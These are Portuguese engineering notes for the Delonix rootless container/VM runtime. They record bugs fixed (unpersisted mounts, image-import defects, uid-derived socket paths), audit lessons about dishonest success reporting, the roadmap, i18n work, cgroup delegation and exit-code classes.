  A anotação `io.containerd.image.name` é a que NOMEIA a imagem no import — sem ela o `ctr` ingere
  os blobs e não regista referência nenhuma: o import "passa" e o pod continua em `ErrImagePull`.
- **Canal para dentro do nó: o bind mount que já existia** (`cluster_dir` ↔ `NODE_SHARED`
  `/kind/delonix`, o mesmo por onde o `cluster create` troca `kubeadm.conf`/`kubeconfig`) — sem
  plumbing de stdin e sem 2.ª cópia do rootfs. O `kind` real faz `docker save | docker exec`;
  aqui as duas metades já são nossas.
- `--all-platforms` no `ctr images import` (senão o ctr filtra pela plataforma DELE e pode
  importar zero reportando sucesso); o `.tar` é apagado sempre a seguir (é uma cópia completa da
  imagem em disco — este host já teve disk-pressure por menos); nós parados são REPORTADOS, nunca
  saltados em silêncio.
- **3 defeitos apanhados no v0.35.1, TODOS invisíveis ao `ctr`** (que reportava sucesso, e o
  `crictl images` até listava a imagem): (1) a imagem era registada com o nome CURTO
  (`nginx:alpine`) e o kubelet resolve a forma normalizada (`docker.io/library/nginx:alpine`) →
  `ErrImageNeverPull` (agora `containerd_ref()`, puro e testado, com a regra do docker; um registo
  explícito NUNCA é reescrito); (2) o `ctr images import` não usa o snapshotter do plugin CRI mas
  o default GLOBAL (`overlayfs`), que não monta em userns rootless — lê-se agora o
  `fuse-overlayfs` da config do nó e passa-se `--snapshotter`, tal como o `kind` real faz; (3) o
  **transfer service do containerd 2.x** recusa desempacotar (`no unpack platforms defined`) — o
  caminho clássico `--local` funciona, e é PROBADO (não existe no containerd 1.6) em vez de
  assumido; `--platform linux/<arch>` em vez de `--all-platforms` (é este que dispara o erro).
- **Lição de validação**: "o comando devolveu 0" não é prova de nada aqui. A prova é um `kubectl
  run --image-pull-policy=Never` a ficar **Running** — nenhum registo o pode salvar. Validado
  assim no `delonix-stage` (containerd 2.1.3, rootless).

### BUG GRAVE corrigido a caminho disto: `-v` nunca era persistido → volumes PERDIDOS no `start`

Descoberto ao ver o `cluster load` falhar com o nó a não ver o `/kind/delonix`: `cmd_run` metia os
mounts resolvidos SÓ no `RunSpec` (aplicado no spawn) e **nunca no registo**; o `cmd_start`
reconstrói o `RunSpec` a partir de `c.mounts` — um campo que estava portanto SEMPRE vazio. Um
`container start` de qualquer coisa criada com `-v` voltava a correr **sem bind mounts e sem
volumes nomeados**, e as escritas que deviam ir para o volume iam em silêncio para o rootfs do
container (uma base de dados reiniciada "funciona" e escreve para o sítio errado). Também partia
os clusters kind: um nó reiniciado perdia o `/kind/delonix`. **Corrigido** com `c.mounts =
mounts.clone()` antes do save (inclui os mounts de CDI de propósito — o `start` nunca re-resolve
um spec CDI, deixá-los de fora perderia o acesso à GPU no 1.º restart). Validado ao vivo:
ficheiro do host visível dentro do container ANTES e DEPOIS de um `stop`+`start`.

**Terceiro bug da MESMA família em dois dias** (a par do `-p` numa rede custom, abaixo, e do
`vm start` que já estava documentado): *estado necessário para RECONSTRUIR o recurso tem de ser
persistido, não só usado uma vez na criação*. Ao ligar/rever qualquer caminho de `start`/`restart`,
compara campo a campo o que a criação USA com o que o registo GUARDA — o que só a criação vê
desaparece no primeiro restart, em silêncio.

### Regressão v0.34.1 → corrigida no v0.34.3: `-p` numa rede custom (o 2.º caminho derivado do uid)

Bug report real, um comando depois da recuperação do v0.34.2: `container run --net <custom> -p
<porta>` (e o `start` de um container assim) falhava com ``slirp api-socket: No such file or
directory``. Containers SEM portas publicadas nunca foram afectados — foi preciso uma carga real
com porta (`kaeso-odoo`, 8069) para o expor.

**Causa**: o `a112754` (v0.34.1) criou um **SEGUNDO caminho derivado do uid** (`runtime_dir()`,
`/tmp/delonix-net-<uid>`) e só o primeiro estava a ser fixado através da fronteira de privilégio.
O publish de uma rede custom corre na **2.ª passagem do re-exec** (`nsenter -U … ip netns exec`,
uid mapeado a **0**): o `reexec_into_netns` passava `DELONIX_ROOT` de propósito (porque
`base_root()` consulta o `geteuid()`) mas nada fixava o dir novo dos sockets → a 2.ª passagem
resolvia `/run/delonix-net` e gastava os retries num directório inexistente. Antes do v0.34.1 os
sockets vinham de `ingress_dir()`, logo o `DELONIX_ROOT` que já era passado tapava-os — **fixar só
o root deixou de ser suficiente sem ninguém notar**.

**Lição a reter (a par da armadilha do `container.userns` e do `status()` por pidfile)**: sempre que
uma constante de caminho passar a derivar do `geteuid()`, grepar por quem a resolve DO OUTRO LADO de
um userns — `.env("DELONIX_ROOT"` marca todos esses sítios. Nenhum teste unitário apanha isto: a
divergência só existe num processo filho com uid mapeado. Corrigido com `infra::runtime_dir_env()`
(um par `(var, valor)` — impossível passar var/valor trocados, e `grep runtime_dir_env` acha todos
os filhos que precisam dele) e `cmd::container::reexec_env` (uma lista partilhada pelos DOIS sítios
de re-exec, para um terceiro não nascer com metade).

## Visão de produto: Universal Runtime (Workload Abstraction Layer)

**Norte do projeto**: o Delonix Runtime não deve evoluir como "mais um motor de VMs" nem como
três CLIs desligadas (`container`/`vm`/`image`). O objectivo é um **Runtime Abstraction Layer**:
uma única API declarativa (`kind: Workload`, `spec.type: container|vm|microvm`) que despacha para
o motor certo, com os backends de computação plugáveis — não hardcoded. Isto é uma direcção, não
uma reescrita: implementa-se por cima do que já existe, não a substituir.

### O que já existe e serve de base (não inventar do zero)

- **`VmBackend`** (`crates/delonix-vm/src/lib.rs:438`) já É o padrão `ComputeDriver` pedido —
  `id()`/`available()`/`boot()` por trás de `CloudHypervisorBackend`/`LibvirtBackend`. Adicionar um
  backend novo (Firecracker, KVM nativo mais fino) é implementar este trait, não desenhar um novo.
- **`delonix-cri`** já dá a perna de "Container Runtime" da unificação (serve `kubelet` via
  `runtime.v1`) — não precisa de um `ContainerController` novo, só de ligação ao mesmo `Workload`.
- **`delonix-net`** (SDN rootless + overlay WireGuard entre nós) já cobre boa parte do "Network
  Engine" do pedido original — falta é NAT/floating-IP/ACL por *tenant*, que é uma noção proibida
  aqui (ver "Regra de ouro" abaixo).
- **`delonix-image`** (pull/registry/CNB/verificação de assinatura) já é o Image Service.
- Cloud-init já existe para VM dourada (secção "Imagem VM dourada" acima) — não é greenfield.
- **Não existe hoje**: modelo `Workload` unificado, plugin system formal para drivers, scheduler
  multi-nó, event bus, `delonixd`. Destes, só os dois primeiros pertencem a este repo — ver abaixo.

### Fronteira com o Portal/Control Plane (aplica a "Regra de ouro" a este pedido)

O texto original desenha Portal, IAM, billing, quotas, inventário multi-cluster Proxmox e
scheduler multi-tenant por cima do runtime. **Nada disso pertence a este repo** — é
`delonix-paas`/Control Plane, pela mesma regra que já proíbe noção de tenant/billing aqui. Um
driver Proxmox *multi-cluster* (inventário, mapeamento tenant↔recursos, scheduler entre clusters)
é trabalho do `delonix-paas`, do mesmo modo que o CRI serve o `kubelet` sem saber quem é o kubelet.
O que pode fazer sentido *aqui* é, no máximo, um `ProxmoxBackend: VmBackend` de baixo nível (um nó,
sem noção de tenant) — não o "Proxmox Driver" com inventário/scheduler do texto original.

### Roadmap faseado

1. **Fase 1 — Unificar o modelo** (curto prazo, aditivo): introduzir `kind: Workload` como camada
   fina sobre os caminhos `container`/`vm` já existentes (`spec.type` decide para onde despacha).
   Zero backend novo nesta fase — só o objecto declarativo e o dispatcher.
2. **Fase 2 — Formalizar o plugin system**: extrair de `VmBackend` um trait geral reutilizável
   por `delonix-runtime-core`, de forma a que o motor de containers também o possa implementar no
   futuro. Backends novos (Firecracker, `ProxmoxBackend` de nó único) entram aqui, um de cada vez,
   cada um com o seu spike GO/NO-GO (mesmo padrão já usado nesta doc para `--privileged`/kind).
3. **Fase 3 — Decisão de filosofia sobre daemon**: `delonixd` só entra em cima da mesa se um event
   bus/observabilidade contínua provar necessidade real — **não é um default**, é uma mudança de
   filosofia (o produto é daemonless por desenho) que precisa da sua própria sessão de planeamento,
   tal como já está registado em "Próximas fases" abaixo.

### Decisões arquitecturais a fechar antes de código

- Shape exacto do YAML `kind: Workload`/`apiVersion: runtime.delonix.io/v1` — precisa de um design
  doc próprio (nomes de campos, versionamento) antes de tocar em `cmd/`.
- Onde vive o trait geral extraído do `VmBackend`: `delonix-runtime-core` (partilhado por
  containers e VMs) é o candidato óbvio — confirmar que não cria dependência circular.
- Scheduler multi-nó fica **fora** deste repo por desenho (é um runtime de nó, não um orquestrador
  de frota) — não abrir issue aqui para isso; é `delonix-paas`/orchestrator.
- Event bus: só decidir o transporte (in-process callback vs. daemon) depois da Fase 3 acima, não
  antes — evita desenhar para um daemon que pode nunca ser aprovado.

## Estado para a próxima sessão (2026-08-10)

> A versão anterior desta secção estava parada em **2026-07-27 / v0.35.1** — onze versões atrás,
> e era a primeira coisa que uma sessão lia para saber onde as coisas estavam. Uma secção de
> «estado» desactualizada mente nos dois sentidos: dá por fazer o que já está feito, e por
> pendente o que já foi fechado. É o mesmo defeito que o `AUDITORIA-E2E.md` teve durante semanas.

Última tag publicada: **v0.46.0**; o `Cargo.toml` ainda diz `0.46.0` e o branch de trabalho é
`ciclo-v046-bloco-a`, com **82 commits por publicar**. As notas da **v0.47.0** já estão escritas
(`docs/releases/v0.47.0.md`) e cobrem os três blocos: o ciclo declarativo (`stack plan`/`apply`
convergente/`destroy`, schema gerado e estável, 18→15 Kinds), o tecto de capabilities do CRI, e o
bloco pequeno (`delonix init`/`version`, o `scan` a recusar imagens VM, a extracção a dobrar).
**Publicar é decisão do dono** — bump + tag `vX.Y.Z`, o CI faz o resto.

**Estado verificável hoje** (medido, não afirmado): `cargo build --workspace`, `clippy
--all-targets` e `fmt` limpos; **792 testes** em 21 suites; arnês de caos **20/20**; bateria E2E
da CLI **198/198**; a documentação sem um único comando ou flag que não exista no binário; i18n a
**232/232** comandos e **0** descrições de flag por traduzir, com dois testes a travar a regressão.

**Três gates novos, e cada um nasceu de uma falha real desta série:**
1. **`ci.yml` → `docs`** — regenera o site e falha se o commitado deixar de ser o gerado, mais o
   `--dry-run`/`validate` de todos os `examples/`. Pagou-se no mesmo dia: apanhou sete páginas
   fora de dia com o `--help` real. **O que NÃO verifica está escrito no job** — um campo
   desconhecido escapa, porque o `warn_unknown_fields` só corre no apply REAL.
2. **`chaos.yml` → bateria E2E** (`scripts/e2e.sh`, 198 verificações sobre a CLI a sério). Fica ao
   lado do caos e não no `ci.yml` porque precisa do MESMO ambiente rootless que aquele job já
   monta. Não corria desde a v0.3.0 — 44 versões — e tinha nove falhas, **oito porque o teste
   codificava um bug entretanto corrigido** (usava `--subnet …/24`, aceite-e-ignorado até o
   `--subnet` passar a valer). Regra: quando uma correcção faz um teste antigo falhar, a primeira
   hipótese é que o teste fixava o comportamento errado.
3. **Cenário de caos `stack_converge`** — ver a secção do IaC.

**Pendente, por ordem de valor:**

1. **Os três ADRs já estão DECIDIDOS** (2026-08-10), e cada um tem skill própria:
   - **0008 (backend Proxmox) — aceite em DUAS fases.** A fase 1, o **registo de backends**, entra
     já: o `backend_for` acaba hoje em `_ => CloudHypervisorBackend`, ou seja um nome desconhecido
     cai num default em vez de falhar — o guarda-rio #6 partido onde é mais provável haver um typo.
     É pequeno, puro e testável sem hypervisor. A fase 2, o backend em si, fica **bloqueada num
     alvo real**, como o spike do kind: não se escreve um backend que nunca se viu arrancar uma VM,
     e o próprio ADR admite que não é testável aqui. Skill: `skills/delonix-vm-backend/`.
   - **0009 (provisionar no TrueNAS) — aceite**, e é o de melhor rácio dos três pela razão que o
     próprio ADR dá: **o appliance TrueNAS arranca e serve a API neste host**, logo o CRUD, a quota
     e as permissões exercitam-se contra um alvo REAL. Duas condições não-opcionais: passagem
     `delonix-runtime-sec` antes do merge (passamos a segurar uma credencial que destrói dados
     noutra máquina) e o caminho destrutivo provado por cenário de caos, não por leitura — o
     precedente é o `volumes rm` da v0.37.0. Skill: `skills/delonix-truenas/`.
   - **0010 (API de gestão remota) — RECUSADO.** Dos três consumidores que o ADR enumera, a
     evidência aponta para o control-plane de frota, e isso é o `delonix-paas`: remoteness sem
     identidade, autorização e auditoria não é remoteness que valha a pena. **Fecha também o F4**
     (a cobertura estreita da API): alargar uma superfície cuja audiência estava indecisa só valia
     depois de a audiência ser conhecida — e é um processo no mesmo host. Reabre-se com um
     consumidor concreto que não seja nem o PaaS nem um agente local.
2. **Volumes anónimos do `compose`** — precisa de decisão de DESENHO antes de código: um `down`
   simples remove um volume anónimo, ou só `down -v`? Nomeação determinística por posição na
   lista (risco de colisão se a ordem mudar) vs. um registo próprio (mais peso). Não avances sem
   responder a isto primeiro.
3. **5 itens de namespace/privilégio/protocolo**, cada um candidato a sessão própria — nenhum é
   dívida rápida, todos tocam fronteiras que este projecto trata com auditoria dedicada (skill
   `delonix-runtime-sec`): `macvlan`/`ipvlan` realizados fisicamente (mesmo em root o código
   nunca foi escrito — distinto do caso rootless, que é limite de CAP_NET_ADMIN e não de código
   em falta); partilha de PID em pods (`shareProcessNamespace`, toca no `spawn()`, já sinalizado
   como função de risco de ~405 linhas); recuperar VMs num respawn do holder (pods e containers já
   recuperam desde a v0.41.0); WebSocket/upgrade tunelado no proxy L7 (`httproute`); `exec`/attach
   interactivo + `--restart` na API `serve docker-api` (a primeira precisa de HTTP hijacking real,
   a segunda de repensar o modelo de supervisor `fork()` para um servidor multi-thread).
4. **Um workflow de CI que reconstrua as imagens de appliance**, como o `vm-image.yml` já faz para
   a golden. As imagens em si já estão publicadas em
   `ghcr.io/angolardevops/delonix-vm-appliances` (2026-08-13) — o `write:packages` que faltava
   já está na conta `angolardevops`; ver a secção «Imagens de appliance».
5. **Gravar os vídeos** — o guião (`docs/ROTEIRO-VIDEOS.md`, 6 episódios, comandos já testados)
   está pronto; a gravação é trabalho do utilizador, não de agente.

**Meia-isolação é pior que nenhuma (incidente real, 2026-08-12).** Correr uma bateria com
`DELONIX_ROOT` isolado e **sem** `DELONIX_NET_RUNTIME_DIR` põe dois roots a disputar
`/tmp/delonix-net-<uid>/{control,slirp}.sock` — os sockets são por UTILIZADOR e os pidfiles
por ROOT. O motor tem um guarda que recusa isso («another delonix state root on this user
already owns the network infra»), e ele **deixa de disparar** assim que o root isolado ganha
estado de ingress próprio: a partir daí sobe um pin/slirp SEUS por cima dos mesmos caminhos.
O `net netns up` seguinte, corrido do root REAL, encontrou o controlo partido, **reconstruiu a
infra inteira** (pin/control/slirp novos) e **reiniciou um container de produção** — a
recuperação-por-reinício da v0.41.0 a funcionar como desenhada, sobre um problema que eu
próprio criei. Os outros três containers mantiveram o PID e as portas publicadas continuaram
a responder. O `scripts/e2e.sh` passou a RECUSAR-SE a correr a secção do cloud-hypervisor
nessa configuração, e o cabeçalho diz porquê. **Fica também um achado por investigar**: o
guarda é contornável — devia olhar para quem está VIVO no socket partilhado, não só para a
presença de um pidfile no root actual.

**Lição de método que esta série repetiu três vezes, e vale mais que qualquer dos itens acima:**
uma verificação só vale o que o seu filtro deixa passar. Um `grep "^  delonix"` sobre a saída de
um teste cortou-me as linhas seguintes de um bloco multi-parágrafo; um limiar de «mais de 25
caracteres» escondeu-me o `container ps`; e silenciar o `stderr` de um gerador deixou-o falhar a
meio com o site escrito por metade. Quando uma medição parecer boa demais, **desliga o filtro e
volta a contar**.

## Próximas fases (pedidas, não implementadas — cada uma precisa da sua própria sessão de planeamento)

- **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (sem `kubeadm`) — cluster k8s
  local via `kind` (shell-out à ferramenta já instalada no host). **Bloqueado** pelo NO-GO do
  spike acima — o `kindest/node` não arranca sob o nosso `--privileged` hoje; ver secção "Cluster
  modo Kind sem Docker — investigação". Precisa de instrumentação de arranque antes de continuar.
- **FEITO (v0.24.0)**: `etcd: external` em `delonix cluster apply` + `--etcd-cluster <N>` em
  `delonix cluster kubeadm` — ver a secção "Cluster kubeadm" acima para o detalhe completo
  (PKI própria via `rcgen`, bootstrap paralelo, `--config` YAML do kubeadm).
- **FEITO (v0.23.0)**: paralelizar a preparação de host em `cluster apply` (era sequencial nesta
  v1) — ver a secção "Cluster kubeadm" acima.
- **`delonixd`** (daemon opcional em userspace) + **dataplane de ingress/egress próprio** (evitar
  um veth por container — hoje `infra::do_attach` cria sempre 1 veth-par por container,
  confirmado) + **firewall dinâmico** para publish de portas + **eBPF** para observabilidade +
  **auto-dimensionamento** no pico. Nenhuma peça disto existe hoje (zero eBPF/autoscaling/daemon
  no repo, confirmado por grep). É uma mudança de filosofia (o produto é daemonless por desenho)
  e um dataplane novo de raiz — meses de trabalho de um crate dedicado, não uma sessão.

## i18n (fonte EN + catálogo pt.po embutido) — `cmd/po.rs`

Desde a v0.5.0, **a fonte de strings de utilizador é 100% EN** e as traduções vivem
num catálogo gettext embutido (`crates/delonix-runtime-bin/data/pt.po`, 171 msgids),
activado por `--l18n=pt`/`DELONIX_L18N=pt`. Regras para não regredir:

- **String nova de UI = EN no código + entrada no `pt.po`.** Nunca voltar aos pares
  inline `tr(en, pt)` (morreram na fase 3a) nem a `if is_pt()` manuais.
- `po::t(&'static str)` para strings fixas; `po::tf(template, &[(nome, valor)])` para
  interpoladas — o `format!` exige literais, logo traduz-se o TEMPLATE com
  placeholders NOMEADOS (`{port}`) e substitui-se depois (nomeados de propósito:
  uma tradução pode reordená-los).
- **O help do clap traduz-se em runtime**: a língua decide-se com `po::peek_lang()`
  ANTES do parse (o help gera-se durante), e `po::translate_help` reescreve
  about/help do `Command` inteiro. Armadilha conhecida: o derive REMOVE o ponto
  final do help curto — `t_help` compensa (lookup com e sem `.`).
- Parser `.po` próprio (~50 linhas, testado) — sem crate `gettext` (regra de
  supply-chain). `parse_po` cobre msgid/msgstr multi-linha + escapes.
- **Comentários do código: 100% EN (FEITO).** Todos os comentários (`//`, `///`,
  `//!`) dos 9 crates de motor (PR #26) e do `delonix-runtime-bin` (PR #27) foram
  traduzidos PT→EN; o help de CLI que ainda vivia em PT no código (doc-comments
  `///` dos enums clap + campos `#[arg]`) passou a EN na fonte, com o PT no
  `pt.po` (+183 entradas na fase 2). Regra a manter: comentário/help novo = EN no
  código; a tradução vai para o `pt.po` (o `t()`/`translate_help` degradam para EN
  se faltar a entrada, nunca deixam a UI muda). Só identificadores/nomes de teste
  em PT sobrevivem (não são texto de utilizador).
- **FEITO (v0.23.0)**: mensagens de erro dos crates de MOTOR (não podem depender do
  bin) traduzem-se no printer de erros do `main.rs`, por lookup do texto EN —
  `po::t_dyn`. Dois bugs fechados: (1) `t_dyn` fazia lookup EXACTO contra o texto
  TOTALMENTE renderizado do erro, mas esse texto é sempre um prefixo EN fixo
  (`"invalid argument: "`, `"no such container: "`, ...) colado à mensagem real —
  nunca batia com nada, mesmo havendo entrada `pt.po` para a mensagem interna;
  corrigido reconhecendo os 6 moldes `#[error(...)]` traduzíveis de
  `delonix_runtime_core::Error` (`Io`/`Json`/`Runtime` ficam de fora — o texto vem
  de um errno/serde do SO, não é nosso para traduzir) e traduzindo prefixo/
  interior/sufixo separadamente. (2) o caminho de erro PRINCIPAL do `main.rs`
  (`run()` → `cmd::output::error`) nunca sequer chamava `t_dyn` — só os 4
  re-execs escondidos o faziam; e `for_each_id` (`stop`/`rm`/... com vários ids)
  tinha o seu próprio `eprintln!` que também nunca passava por ele.
- **FEITO (v0.47.0): a cobertura passou a ser MEDIDA, e há teste.** Esta secção afirmava que o
  help do clap se traduz em runtime — e traduz-se; o que nunca tinha sido medido era quanto do
  catálogo existia. Medido: **103 dos 232 subcomandos** imprimiam o help em EN sob `--l18n=pt`
  (o grupo `container` inteiro, 28), e **206 descrições de flag**. Fechados os dois, a zero.
  Dois testes em `main.rs` (`help_i18n_tests`) percorrem a árvore do `clap::Command`:
  `todo_o_help_de_comando_tem_traducao_pt` é **estrito**, e
  `o_help_dos_argumentos_so_pode_encolher` é um **ratchet** — falha se o número subir (flag nova
  sem entrada) E se descer (traduz-se e baixa-se a constante no mesmo commit); um `<=` deixaria
  a dívida a ler-se como verde. Consultam o CATÁLOGO (`po::has_pt_translation`, `#[cfg(test)]`) e
  não o `t_help`: em EN o `t_help` devolve o próprio texto e o teste passaria pela razão errada.
  **A excepção está declarada no código** (`is_same_in_both`) — `Containers: run/ps/stop/...` lê-se
  igual nas duas línguas, e pedir tradução para isso é como um catálogo ganha ruído.
  **Armadilha que custou duas passagens**: o `-h` mostra o `about` curto e o `--help` o
  `long_about`/`long_help` INTEIRO — 8 `long_about` e um `long_help` multi-parágrafo só
  apareceram depois, e um `grep "^  delonix"` sobre a saída do teste cortava-lhes as linhas
  seguintes. Ao gerar entradas multi-linha, **não acrescentar `\n` na última linha**: o lookup
  deixa de bater e o sintoma é o teste passar (a chave existe) com o `--help` a continuar em EN.

## Auditoria sistemática dos 208 subcomandos (v0.37.0) — 4 caminhos de perda de dados

Pedido: para cada comando do `--help`, verificar se faz o que promete com todos os
parâmetros, e identificar bugs, gaps, problemas de segurança e crashes silenciosos que
possam comprometer produção ou perder dados de volumes/storage. Superfície mapeada por
dump recursivo de `-h` (208 subcomandos), testada **ao vivo num host real** — não só
lida. 23 achados, todos reproduzidos antes de corrigidos. Notas completas em
[docs/releases/v0.37.0.md](docs/releases/v0.37.0.md).

**A lição transversal, que vale mais do que os bugs**: a classe dominante não foi
"comando em falta" nem "comando errado" — foi **relato desonesto**. Três formas, todas
invisíveis a um `cargo test`:

1. **Destruir dados e reportar falha.** `volumes rm` em dados subuid apagava o
   `meta.json` antes de levar EACCES no `_data` → o volume desaparecia de `ls`/`df` e
   os bytes ficavam; um `create` do mesmo nome entregava-os ao tenant seguinte. `vm rm`
   apagava o qcow2 **antes** de verificar se a VM existia, e depois devolvia
   `no such VM`. Regra que fica: **não destruir nada antes de saber que o objecto é
   nosso para destruir, e apagar a contabilidade em ÚLTIMO lugar.**
2. **Reportar destruição sem destruir.** `sharevolume rm --purge-data` imprimia
   "data deleted" quando o `remove_dir_all` falhava com EACCES em dados subuid.
3. **Reportar sucesso sobre falha.** `container run` devolvia 0 para `exit 42`, para um
   `execve` falhado e para um container que nunca arrancou (rootfs impossível de
   preparar, 126). Um backup ou uma migração falhada passavam por bons.

**Armadilhas concretas a reter para quem mexer aqui a seguir:**

- **`fs::remove_dir_all` não é atómico**: apaga entradas à medida que percorre, por
  isso um EACCES a meio deixa o directório PARCIALMENTE apagado. Nunca o usar sobre uma
  árvore que contenha metadados cuja ausência mude o significado do objecto.
- **`as u64` sobre `f64` é SATURANTE em Rust**: `parse_size_bytes("99999999999t")` dava
  `u64::MAX` — uma quota que o `inspect` mostra como definida e que é, de facto, quota
  nenhuma. Qualquer conversão de tamanho vinda de input precisa de guarda de overflow.
- **Um `read_dir` que falha e devolve 0 é indistinguível de um directório vazio** — e em
  rootless é o caso NORMAL, não uma extremidade (toda a base de dados gerida faz
  `chmod 700` sob userns mapeado). Daí `Usage { bytes, unreadable }` e
  `QuotaState { …, measured }`: medição incompleta é *desconhecida*, nunca zero. O novo
  re-exec `__duusage` mede de dentro do userns, mesmo idioma do `__volsnap`/`__buildtar`.
- **`remove_tree_mapped` re-executa `current_exe()`** — correcto no binário real, mas num
  **binário de teste** re-entra no harness, que lê `__rmtree <path>` como filtros de nome,
  corre zero testes e sai **0**. Esse falso sucesso suprime qualquer fallback. Onde
  importa, tentar a remoção simples PRIMEIRO (mais rápida, sem fork) e o mapeado só como
  recurso.
- **Um teste pode codificar o bug.** `default_project_name_normaliza_o_directorio`
  afirmava `default_project_name("compose.yml") == "default"` — exactamente o
  comportamento que colapsava todos os projectos compose num só e fazia um `down -v`
  apagar o volume de outro projecto. O teste só passava caminhos ABSOLUTOS; a
  invocação real é sempre relativa. Ao escrever um teste de uma função de caminho,
  cobrir a forma que o código de produção realmente lhe passa.
- **O cofre cifrado não vale nada se o consumidor persistir o plaintext.** `--secret`
  escrevia os valores decifrados em `containers/<id>.json` e o `container inspect`
  imprimia-os — enquanto o `secret inspect` os redige atrás de `--reveal`. Os valores
  passam a ser resolvidos no spawn a partir dos NOMES persistidos (como o
  `--secret-files` já fazia, razão pela qual esse modo nunca teve o bug); efeito
  secundário bem-vindo: um segredo rodado aplica-se no `start` seguinte.
- **`let _ =` sobre entropia é fail-open.** `random_token` do streaming CRI partia de
  `[0u8; 16]` e descartava o erro do `read_exact` — sem `/dev/urandom`, o token era a
  constante de zeros, e estas URLs dão execução de código dentro de um pod.

**Decisão de desenho registada (A7).** O exit code de um container `-d` **sem**
`--restart` continua a não ser capturável: o motor não é o pai real do processo. A
opção escolhida foi *parar de mentir* em vez de acrescentar um processo supervisor por
container (o modelo do conmon do podman): `ps -a` mostra `Exited (unknown)` em vez de
`Dead`, e `wait` recusa-se a devolver o 137 fabricado, dizendo como obter o real. Com
supervisor (`--restart on-failure`/`always`/`unless-stopped`) o código real continua a
ser capturado. Fechar isto por omissão fica como decisão de filosofia, não bug fix.

**Por fazer, deliberadamente**: `--format json` nos comandos de listagem (a automação
tem de parsear tabelas alinhadas) — superfície de API nova em ~10 comandos, merece
desenho próprio.

## Limites de recurso exigem cgroup delegado (medido numa VM limpa, 2026-08-04)

**`-m`/`--cpus`/`--pids-limit` são inertes numa sessão SSH normal.** Descoberto a
correr o arnês de caos DENTRO de uma VM criada com o próprio `delonix vm create` —
um host limpo alcançado por SSH, que é como se chega a um servidor a sério. No host
de desenvolvimento passava despercebido porque a shell corre sob o scope do VS Code,
que ESTÁ dentro de `user@<uid>.service`.

Medido, com `-m 128M --cpus 0.5`:

```
cgroup: /user.slice/user-1000.slice/session-40.scope   (partilhado com sshd)
memory.max=max  cpu.max=max  pids.max=max  memory.swap.max=max
```

**É regra do cgroup v2, não bug.** Um scope de sessão SSH é IRMÃO de
`user@<uid>.service`, não filho; migrar um pid entre os dois exige escrever o
`cgroup.procs` do antepassado comum (`user-<uid>.slice`), que é da root:

```
mkdir  user@1000.service/probe                  → ok
echo $$ > user@1000.service/probe/cgroup.procs  → EACCES
```

Derivar a fronteira do uid em vez de a procurar no caminho **foi tentado e medido a
não funcionar** — o comentário antigo do `user_service_base` afirmava que a migração
era permitida, e não é. O fallback foi apagado em vez de deixar código que só cria um
directório onde nada entra.

**O que funciona** (validado, os cinco limites aplicados + tecto agregado):

```
systemd-run --user --scope -p Delegate=yes -- delonix container run ...
```

O `install.sh` passou a TESTAR a delegação de verdade (cria um cgroup filho e tenta
activar `+memory`; ler `cgroup.controllers` não chega — o controlador pode estar
listado e a migração continuar proibida) e imprime o remédio quando falta. O arnês
distingue os dois casos: `aggregate-ceiling` reconhece um `session-*.scope` e faz SKIP
com o remédio; `delegated-scope` VERIFICA que sob um scope delegado tudo aplica.

**Armadilha do `install.sh` apanhada ao mesmo tempo**: `GPU_INFO=$(lspci | grep -Ei
'vga|3d controller' | ...)` sob `set -euo pipefail` — um `grep` sem correspondência
sai 1, o `pipefail` propaga, a atribuição falha e o instalador MORRIA em silêncio logo
depois de "preparing the host". Acontecia em todo o host sem dispositivo VGA: qualquer
servidor headless e praticamente toda a VM. Uma etiqueta cosmética de GPU nunca pode
poder falhar uma instalação.

## Códigos de saída com classe (v0.49.0) — «não existe» deixou de ser «rebentou»

Medido antes de escrever código: `container inspect <inexistente>` → **1**,
`volumes rm <inexistente>` → **1**, um erro genérico → **1**. Só o `clap` se
distinguia (2). Portanto as duas respostas que um reconciliador mais precisa de
separar — «cria, porque falta» e «pára, porque falhou» — eram o mesmo número, e o
único sinal restante era a MENSAGEM. Que é **traduzida**: um script com
`grep 'no such'` funciona na máquina onde foi escrito e deixa de classificar num
nó com `--l18n=pt`. Parsear a mensagem era pior que não ter a informação.

- **Um só sítio decide** — `cmd/exitcode.rs::for_error`, puro, a partir do TIPO
  do erro. O `match` é **exaustivo de propósito**: uma variante nova de
  `delonix_runtime_core::Error` pára a compilação aqui e obriga a decidir, que é
  o contrário do que um `_ =>` faz (arquivar em «genérico» sem avisar ninguém).
- **`3` e `4` não são inventados** — são os códigos do LSB que o `systemctl`
  ainda fala (3 = não está a correr, 4 = não há tal unidade); `5` (conflito) é o
  número livre seguinte. Nada colide com o `2` do clap (que é TAMBÉM o «há
  alterações» do `stack plan --detailed-exitcode`), nem com o 126/127/128+N da
  shell — há teste a exigi-lo.
- **`run`/`exec` continuam a devolver o código do WORKLOAD**, e é a regressão
  mais fácil de introduzir aqui: esses caminhos saem por
  `propagate_exit_status`/`process::exit` e nunca passam por este módulo.
  Confirmado ao vivo com um container real, incluindo `exit 4` e `exit 5` — um
  workload que escolha um número que também é classe do motor mantém-no.
- **O `for_each_id` tem caminho de saída PRÓPRIO** (sai antes de o `main` ver o
  erro): sem o mesmo mapa lá, `rm a b` respondia 1 onde `rm a` diz 4. Um lote
  todo da mesma classe mantém-na; um lote MISTO cai no genérico — escolher a
  classe do primeiro faria o resultado depender da ordem em que os ids foram
  escritos.

**Dois erros mal etiquetados, encontrados a ligar isto** — e sem os corrigir a
funcionalidade era decorativa:

1. **`util::find` dizia `Invalid` para «não existe»**, e é o resolvedor de TODOS
   os verbos de container (`inspect`/`stop`/`rm`/`logs`/`exec`/`port`/`wait`...).
   Ou seja: o recurso mais usado do motor era o único que NÃO se classificava,
   enquanto `volumes`/`network`/`secret`/`vm` já respondiam `NotFound`. Dizia
   ainda a mesma coisa por outras palavras que o `Store::load` («container not
   found: x» vs. «no such container: x»); passou a usar a redacção do store.
   O caso AMBÍGUO (um prefixo que casa com três) fica `Invalid` — aí o passo
   seguinte de quem chama é corrigir o argumento, não criar o recurso.
2. **`Error::Conflict` tinha ZERO produtores.** O `delonix-mgmt` fazia match nele
   (409) e ninguém o construía; as recusas reais de «já existe» diziam `Invalid`
   e saíam 400/1. Publicar um código para uma variante que nada constrói seria
   **um número que nunca pode voltar** — a mesma decoração do digest-pinning que
   a auditoria #3 apanhou. As recusas foram movidas para onde pertenciam (os três
   `create*` do `NetworkStore`, o `volumes snapshot create`), o que de caminho
   corrige o HTTP para 409.

**O que ficou de fora, e porquê**: «pré-condição do host por satisfazer» (uma
